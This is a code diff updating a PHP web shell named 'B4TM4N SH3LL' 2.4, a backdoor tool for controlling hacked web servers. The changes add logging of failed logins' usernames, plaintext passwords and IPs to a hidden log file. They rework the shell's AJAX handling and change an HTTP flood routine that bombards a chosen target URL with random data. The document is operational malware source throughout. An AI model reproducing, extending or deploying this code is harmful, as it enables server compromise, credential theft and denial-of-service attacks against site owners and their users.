@@ -13,13 +13,15 @@
  *
 */
 
+$x="BCM8:6b0916e774b3f6a142c84fb1bee1afb14f49e882"; // B64E('user') : sha1(md5('pass'))
+
 $config=[
-	"user"    => "zaIgxSRawZ==",                             // B64E('user')
-	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
-	"title"   => "B4TM4N SH3LL",                             // Title
-	"version" => "2.4",                                      // Version
-	"debug"   => true                                        // Debug Mode
+	"title"   => "B4TM4N SH3LL", // Title
+	"version" => "2.4",          // Version
+	"debug"   => true            // Debug Mode
 ];
+
+$account=explode(':',$x);
 
 session_start(); // Session Start
 
@@ -64,13 +66,28 @@ if(request_method=="POST")
 {
 	if(any("username",$_REQUEST)&&any("password",$_REQUEST)&&any("signin",$_REQUEST))
 	{
-		if((B64E($_REQUEST['username'])==$config["user"])&&(sha1(md5($_REQUEST['password']))==$config["pass"]))
+		if((B64E($_REQUEST['username'])==$account[0])&&(sha1(md5($_REQUEST['password']))==$account[1]))
 		{
 			session_regenerate_id();
 			$_SESSION['action']=[
 				"username" => B64E($_REQUEST['username']),
 				"password" => sha1(md5($_REQUEST['password']))
 			];
+		}
+		else
+		{
+			$log=[
+				"Username: ".$_REQUEST['username'],
+				"Password: ".$_REQUEST['password'],
+				"Remote IP: ".remote_addr,
+				"Time: ".date('Y-m-d H:i:s'),
+				"-------------------------\r\n",
+			];
+			$file=dirname(__FILE__)._.'.log';
+			$write_log=implode($log,"\r\n");
+			$op=fopen($file,'a+');
+			fwrite($op,$write_log);
+			fclose($op);
 		}
 	}
 }
@@ -354,11 +371,19 @@ function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);e
 	}
 	function getAjax(txt,id,method,url){
 		var xmlhttp;
+		var urlf="";
+		var data=new FormData();
+		var params=url.split("&");
+		for(i=0;i<params.length;i++){
+		val=params[i].split("=");
+		if(val[0]=='text-encode'){
+		data.append(val[0],val[1]);
+		}else{if(val[0].indexOf('?')<0)
+		{urlf+='&'+val[0]+'='+val[1];}}}
 		if(txt){document.getElementById(id).innerHTML="Please Wait... <div class='loading'></div>";
 		}else{document.getElementById(id).value="Please Wait...";}
 		if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();
 		}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
-		xhr=xmlhttp;
 		xmlhttp.onreadystatechange=function(){
 		if(xmlhttp.readyState==4&&xmlhttp.status==200){
 		if(txt){document.getElementById(id).innerHTML=xmlhttp.responseText;
@@ -366,8 +391,9 @@ function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);e
 		}else if(xmlhttp.readyState==4&&xmlhttp.status!=200){
 		if(txt){document.getElementById(id).innerHTML="Error";
 		}else{document.getElementById(id).value="Error";}}};
-		xmlhttp.open(method,url,true);
-		xmlhttp.send();
+		xmlhttp.open(method,window.location.href+urlf,true);
+		xmlhttp.send(data);
+		xhr=xmlhttp;
 	}
 	function ajaxAbort(txt,id){
 		if(txt){document.getElementById(id).innerHTML="Canceled";
@@ -717,9 +743,9 @@ function GetFilePerm($x)
 	$perms=@fileperms($x);
 	switch ($perms & 0xF000) 
 	{case 0xC000:$info='s';break;case 0xA000:$info='l';break;
-    case 0x8000:$info='r';break;case 0x6000:$info='b';break;
-    case 0x4000:$info='d';break;case 0x2000:$info='c';break;
-    case 0x1000:$info='p';break;default:$info='u';}
+	case 0x8000:$info='r';break;case 0x6000:$info='b';break;
+	case 0x4000:$info='d';break;case 0x2000:$info='c';break;
+	case 0x1000:$info='p';break;default:$info='u';}
 	$info .=(($perms & 0x0100)?'r':'-');$info .=(($perms & 0x0080)?'w':'-');
 	$info .=(($perms & 0x0040)?(($perms & 0x0800)?'s':'x' ):(($perms & 0x0800)?'S':'-'));
 	$info .=(($perms & 0x0020)?'r':'-');$info .=(($perms & 0x0010)?'w':'-');
@@ -970,7 +996,7 @@ printf("<div id='header'>
 		<div class='content'>",
 		php_uname(),server_software,
 		server_name,server_name,gethostbyname(http_host),server_port,
-		B64D($config['user']),remote_addr,remote_port,
+		B64D($account[0]),remote_addr,remote_port,
 		GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),
 		GetFileSize(@disk_free_space($dir)),GetFileSize(@disk_total_space($dir)),
 		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['version'],
@@ -2560,7 +2586,7 @@ if(any("x",$_REQUEST))
 					<label>Username</label> <input type='text' name='change-username' autocomplete='off' value='%s'/> <br>
 					<label>Password</label> <input type='text' name='change-password' autocomplete='off'value=''/><br>
 					<input type='submit' value='Change' onclick=\"return confirm('Sure ?');\"/>
-				</form></div>",B64D($config['user']));
+				</form></div>",B64D($account[0]));
 
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="change")
 		{
@@ -2570,18 +2596,18 @@ if(any("x",$_REQUEST))
 
 			if (!empty($username)&&!empty($password))
 			{
-				$pass_from=$config['pass'];
-				$pass_to=sha1(md5($username));
-				$content=file_get_contents($filename);
-				$chunk=explode($pass_from,$content);
-				$content=implode($pass_to,$chunk);
-				$change=file_put_contents($filename,$content);
-
-				$user_from=$config['user'];
+				$user_from=$account[0];
 				$user_to=B64E($password);
 				$content=file_get_contents($filename);
 				$chunk=explode($user_from,$content);
 				$content=implode($user_to,$chunk);
+				$change=file_put_contents($filename,$content);
+
+				$pass_from=$account[1];
+				$pass_to=sha1(md5($username));
+				$content=file_get_contents($filename);
+				$chunk=explode($pass_from,$content);
+				$content=implode($pass_to,$chunk);
 				$change=file_put_contents($filename,$content);
 
 				if($change)
@@ -3208,21 +3234,22 @@ if(any("z",$_REQUEST))
 					<div class='hash'>
 						<input type='submit' onclick=\"
 						url='';
+						textencode=window.btoa(document.getElementById('hashtext').value);
 						radios=document.getElementsByName('encr');
 						for(var i=0,length=radios.length;i<length;i++){
 							if (radios[i].checked){
 								switch(radios[i].value){
 									case 'basic':
-										url='?z=encryptor&opt=basic&hash='+document.getElementById('basic-hash').value+'&text='+document.getElementById('hashtext').value;
+										url='?z=encryptor&opt=basic&hash='+document.getElementById('basic-hash').value+'&text-encode='+textencode;
 									break;
 									case 'extra':
-										url='?z=encryptor&opt=extra&hash='+document.getElementById('extra-hash').value+'&text='+document.getElementById('hashtext').value;
+										url='?z=encryptor&opt=extra&hash='+document.getElementById('extra-hash').value+'&text-encode='+textencode;
 									break;
 									case 'crypt':
-										url='?z=encryptor&opt=crypt&salt='+document.getElementById('crypt-salt').value+'&text='+document.getElementById('hashtext').value;
+										url='?z=encryptor&opt=crypt&salt='+document.getElementById('crypt-salt').value+'&text-encode='+textencode;
 									break;
 									case 'hash':
-										url='?z=encryptor&opt=hash&hash='+document.getElementById('hash-hash').value+'&raw='+document.getElementById('hash-raw').checked+'&text='+document.getElementById('hashtext').value;
+										url='?z=encryptor&opt=hash&hash='+document.getElementById('hash-hash').value+'&raw='+document.getElementById('hash-raw').checked+'&text-encode='+textencode;
 									break;
 								}
 								break;
@@ -3231,10 +3258,10 @@ if(any("z",$_REQUEST))
 						return getAjax(false,'hashresult','POST',url);
 						\"/>
 						<input type='submit' onclick=\"
-							temp=document.getElementById('hashresult').value;
-							temp1=document.getElementById('hashtext').value;
-							document.getElementById('hashtext').value=temp;
-							document.getElementById('hashresult').value=temp1;
+							tempi=document.getElementById('hashresult').value;
+							tempi1=document.getElementById('hashtext').value;
+							document.getElementById('hashtext').value=tempi.trim();
+							document.getElementById('hashresult').value=tempi1.trim();
 						\" value='Swap'/>
 					</div>
 				</div>
@@ -3316,7 +3343,7 @@ if(any("z",$_REQUEST))
 		{
 			ob_clean();
 			$opt=$_REQUEST['opt'];
-			$text=$_REQUEST['text'];
+			$text=base64_decode($_POST['text-encode']);
 			if ($opt=='basic')
 			{
 				$hash=$_REQUEST['hash'];
@@ -3559,27 +3586,33 @@ if(any("z",$_REQUEST))
 					        proccess=0;
 
 						var makeHttpRequest=function(){
-							var buff=new ArrayBuffer(1024);
-							var bits=new Int8Array(buff);
+							var data=new FormData();
+							var buff=new ArrayBuffer(10240);
 							var xhrx=new XMLHttpRequest();
-							xhrx.open("POST",targetNode.value,true);
-							xhrx.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');
 							xhttp=xhrx;
+							xhrx.open("POST",targetNode.value,true);
+							//xhrx.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');
 							xhrx.onreadystatechange=function(){
 							    if(xhrx.readyState==XMLHttpRequest.DONE){
-							    	if(xhrx.status!=0){
+							    	if(xhrx.readyState==4&&xhrx.status==200){
 								    	onSuccess();
-								    }else{
-								    	onProcess();
 								    }
+								    onProcess();
 							   	}
 							   	onRequest();
 							}
-							for(var i=0;i<bits.length;i++){
-								bits[i]=i%%255;
+							random=function(length){
+								var array=new Uint16Array(length);
+								window.crypto.getRandomValues(array);
+								var str = "";
+								for (var i=0;i<array.length;i++){
+									str+=String.fromCharCode(array[i]);
+								};
+								return str;
 							}
-							bits[\'stamp\']=messagesNode.value;
-							xhrx.send(buff);
+							data.append(messagesNode.value,random(buff));
+							xhrx.send(data);
+							
 					        };
 
 						var onRequest=function(){
